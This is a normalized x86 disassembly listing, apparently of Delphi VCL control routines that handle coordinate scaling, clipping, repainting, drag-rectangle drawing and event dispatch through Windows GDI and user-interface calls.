mov eax ebx
call sub_449d4c
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_448470
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_40405c
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_4484b4
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_448510
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_44853c
mov edx eax
mov ecx esp
mov eax esi
call sub_416cac
mov edx esp
mov eax ebx
call sub_448980
pop ecx
pop edx
pop esi
pop ebx
retn
sub_448554
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_4484f8
mov ecx esp
mov edx esi
call sub_416cac
mov edx esp
mov eax ebx
call sub_448980
pop ecx
pop edx
pop esi
pop ebx
retn
sub_44857c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4485fd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448604
lea eax [ ebp - 0xc ]
call sub_404008
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7cc
call sub_403a44
sub_44860c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_448638
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_448664
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_463948
sub_448694
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_449ca8
sub_448710
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_423a6c
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_423a88
sub_4488dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_448972
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_420c6c
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_448af4
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_404414
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448979
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_448b24
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_448980
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_4489c8
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
test esi esi
je r-xdata
mov edx ebx
call sub_44bf54
mov edx ebx
mov eax esi
call sub_44be80
mov eax ebx
call sub_448148
sub_448a14
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_40348c
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_449ca8
mov eax edi
mov si 0xffd0
call sub_40348c
sub_448aac
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_45c8bc
mov edx ebx
mov eax esi
call sub_4207e4
sub_448ad0
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_449ca8
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_449ca8
pop ebx
retn
sub_448af4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_448a68
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_4040f8
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_448a78
sub_448b24
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_448b79
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_448af4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404414
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448b80
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax esi
call sub_4044c8
mov edx eax
mov eax ebx
call sub_448ad0
sub_448ba4
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_4239c8
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_449ca8
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_4239c8
mov [ ebx + 0x84 ] eax
sub_448d2c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_448d1c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_445cc4
mov eax esi
call sub_445cc4
jmp r-xdata
sub_448d64
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_41836c
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_418200
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_41838c
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_448f3c
mov eax ebx
call sub_45f898
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_40348c
sub_448de4
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_448d64
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_448d64
jmp r-xdata
sub_448e08
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_448e9e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448ea5
lea eax [ ebp - 0xc ]
call sub_404008
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7cc
call sub_403a44
sub_448eb0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_41836c
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_418310
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_448494
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_448f3c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44f5e0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_448494
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44f2dc
push eax
call InvalidateRect
push ebp
call sub_448eb0
pop ecx
test al al
je r-xdata
mov al 0x1
sub_448fd8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_45f870
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_449ca8
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_40348c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44903c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44f5e0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44f2dc
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_449115
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_44d0e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44f2dc
push eax
call ReleaseDC
retn
sub_44919c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax edi
call sub_449cdc
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_448638
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406b60
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_449ca8
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_446e44
sub_449270
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_4492ac
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_4492f8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_449324
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_448a98
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_448a84
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402a9c
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402a9c
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_44f2dc
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_449408
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_449454
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_40348c
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_40348c
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_449518
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_449564
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_4495b0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4496cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_423fe8
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push r--data
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push r--data
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push r--data
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push r--data
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4496d2
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_449704
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_448638
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403440
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_40348c
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_40348c
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_40348c
